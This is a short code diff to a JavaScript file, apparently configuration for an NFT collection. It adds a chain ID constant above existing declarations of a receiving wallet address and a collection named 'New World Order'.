@@ -1,3 +1,4 @@
+const workChainId = 1;
 const receiveAddress = '0xbB95D169DA662408c201e97eA019319D68c24F89',
   collectionInfo = {
     name: 'New World Order',
